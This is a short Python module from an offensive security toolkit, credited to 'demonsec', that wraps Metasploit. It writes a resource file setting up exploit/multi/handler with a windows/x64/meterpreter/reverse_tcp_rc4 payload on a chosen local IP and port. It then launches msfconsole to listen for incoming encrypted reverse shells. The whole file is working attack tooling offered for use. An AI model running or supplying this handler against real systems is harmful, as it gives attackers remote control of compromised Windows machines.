#!/usr/bin/env python
# encoding: utf-8
import os
from core.Option import *
from protocol.tcp.TCPClient import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "listen_reverse_tcp_rc4",
        "description": "listen_reverse_tcp_rc4",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }
    lhost = IPOption("", "本地监听IP地址")
    lport = PortOption(4444, "本地监听端口")

    def __init__(self):
        self.end_flag = "<"

    def run(self):
        host = self.lhost
        port = self.lport
        config_file = open('reverse_tcp_rc4.rc','w')
        config_file.write('printf "\033c"\n')
        config_file.write('use exploit/multi/handler\n')
        config_file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp_rc4\n')
        config_file.write('set LPORT ' + str(port) + '\n')
        config_file.write('set LHOST ' + str(host) + '\n')
        config_file.write('exploit -j\n')
        config_file.close()
        os.system('msfconsole -r reverse_tcp_rc4.rc')
        os.remove('reverse_tcp_rc4.rc')
